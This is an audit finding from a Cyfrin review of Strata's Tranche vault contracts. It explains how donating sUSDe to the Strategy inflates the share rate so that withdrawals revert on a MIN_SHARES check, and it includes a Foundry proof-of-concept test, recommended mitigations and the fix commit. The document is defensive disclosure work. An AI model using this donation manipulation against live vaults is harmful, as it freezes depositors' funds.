---
tags:
  - lang/solidity
  - platform/cyfrin
  - has/github
  - has/poc
  - severity/high
  - sector/gaming
  - sector/staking
  - sector/vault
protocol: "[[Strata]]"
auditors:
  - "[[InAllHonesty]]"
report: "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-08-cyfrin-strata-tranches-v2.0.md"
genome:
  - "[[frozen-funds]]"
  - "[[locked-funds]]"
  - "[[bridge-stuck-asset]]"
---
# Mechanism to prevent donation attack can be gamed to cause withdrawals to revert causing assets to get stuck on the Strategy

- id: 63224
- impact: HIGH
- protocol: [[Strata]] Tranches
- reporter: InAllHonesty (Cyfrin)
- source: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-10-08-cyfrin-strata-tranches-v2.0.md

## Summary


The bug report describes a problem where the withdrawal mechanism in the Tranche contract can be manipulated, causing user-deposited assets to get stuck. This is due to a first donation attack, where an attacker donates sUSDe directly to the Strategy contract, inflating the total assets in the system. When a subsequent deposit is made, the share<=>assets rate is manipulated, causing the Tranche to mint small amounts of shares. This results in the total supply of shares not exceeding the minimum boundary, causing all withdrawals to revert. The report suggests two possible solutions: making a minimum deposit of 1 full USDe when the Tranche is deployed, and taking special care with the deployment script. The bug has been fixed in the Strata contract, but Cyfrin has verified that the fix is also necessary when enabling deposits in the Cyfrin contract.

## Details

**Description:** Each time a withdrawal occurs, a check is performed to ensure that TrancheShares `totalSupply()` doesn't fall below a pre-defined boundary (`MIN_SHARES`). But, there is a way to game this mechanism such that it causes all withdrawals to revert because the `shares<=>assets ratio` is manipulated, which causes the Tranche to mint small amounts of shares, leading to the `totalSupply()` to not exceed the `MIN_SHARES` boundary, as a result, all withdrawals will revert.

```solidity

    function _withdraw(
        ...
    ) internal override {
       ...
        _onAfterWithdrawalChecks();
        emit Withdraw(caller, receiver, owner, assets, shares);
    }

    function _onAfterWithdrawalChecks () internal view {
@>      if (totalSupply() < MIN_SHARES) {
            revert MinSharesViolation();
        }
    }
```

The attack is a first donation attack, in which an attacker donates `sUSDe` directly to the `Strategy`, this inflates the `totalAssets` in the system, and then the attacker makes a deposit for `1.1USDe`, which causes the share<=>assets rate to be manipulated, i.e. for a deposit of 1.1e18 USDe, the Tranche will mint 1 wei of shares. As a result, any subsequent deposit will mint shares at a manipulated rate, and the problem arises when withdrawals are attempted because of the `_onAfterWithdrawalChecks()`, the remaining `totalSupply()` won't exceed `MIN_SHARES`.



**Impact:** The withdrawal mechanism can be broken, causing user-deposited assets to get stuck on the `Strategy` contract.

**Proof of Concept:** Add the next PoC to the `CDO.t.sol` test file, and import the `IErrors` interface in the imports section.
`import { IErrors } from "../contracts/tranches/interfaces/IErrors.sol";`

```solidity
    function test_GameDonationAttackProtectionToTrapAssets() public {
        address alice = makeAddr("Alice");
        address bob = makeAddr("Bob");
        // Same value as in the Tranche contract
        uint256 MIN_SHARES = 0.1 ether;

        USDe.mint(bob, 1000 ether);
        vm.startPrank(bob);
            //@audit => Bob initializes the exchange rate on sUSDe
            USDe.approve(address(sUSDe), type(uint256).max);
            sUSDe.deposit(1000 ether, bob);
        vm.stopPrank();

        uint256 initialDeposit = 1000 ether;
        USDe.mint(alice, initialDeposit);
        USDe.mint(bob, initialDeposit);

        vm.startPrank(alice);
            USDe.approve(address(sUSDe), type(uint256).max);
            sUSDe.deposit(1e18, alice);
            // Step 1 => Alice transfers 1 sUSDe directly to the strategy to inflate the exchange rate and deposits 1.1e18 USDe that results in minting 1 TrancheShare
            sUSDe.transfer(address(sUSDeStrategy), 1e18);
            USDe.approve(address(jrtVault), type(uint256).max);
            jrtVault.deposit(1.1e18, alice);
        vm.stopPrank();

        assertEq(jrtVault.totalSupply(), 1);

        USDe.mint(bob, 1_000_000e18);
        vm.startPrank(bob);
            USDe.approve(address(jrtVault), type(uint256).max);
            //Step 2 => Now Bob deposits 1million USDe into the Tranche
            //Because of the manipulated exchange rate, the total minted TrancheShares for such a big deposits won't even be enough to reach the MIN_SHARES
            jrtVault.deposit(1_000_000e18, bob);
            assertLt(jrtVault.totalSupply(), MIN_SHARES);

            //Step 3 => Bob attempts to make a withdrawal, but the withdrawal reverts because the total shares on the Tranche don't reach MIN_SHARES
            vm.expectRevert(IErrors.MinSharesViolation.selector);
            jrtVault.withdraw(10_000e18, bob, bob);

            vm.expectRevert(IErrors.MinSharesViolation.selector);
            jrtVault.withdraw(100e18, bob, bob);

            vm.expectRevert(IErrors.MinSharesViolation.selector);
            jrtVault.withdraw(90_000e18, bob, bob);

            vm.expectRevert(IErrors.MinSharesViolation.selector);
            jrtVault.withdraw(1e18, bob, bob);
        vm.stopPrank();
    }
```

**Recommended Mitigation:**
1. Consider making a deposit of at least 1 full USDe on the same tx when the Tranche is deployed. Ideally, set the receiver of the deposit as `address(1)`, these shares should be considered unusable, so the minted TrancheShares are effectively used as the lower bound to not fall below the MIN_SHARES.

2. Take special care with the deployment script. To grant approvals to the strategy for pulling the deposited assets from the Tranche, you must call `Tranche::configure` (this function is required to call `StrataCDO::configure`, which requires the 2 Tranches and Strategy to have been deployed).

**Strata:**
Fixed in commit [f344885](https://github.com/Strata-Money/contracts-tranches/commit/f344885d35f2acfd93b80a9c8d37df7e89ae2f08) by transferring any donations made to the strategy before the first deposit into the reserve.

**Cyfrin:** Verified. On the same transaction, when enabling deposits and making the first deposit, `cdo::reduceReserve` must be called before making the first deposit to sweep any donations to the strategy, as deposits were not enabled before this point.

\clearpage
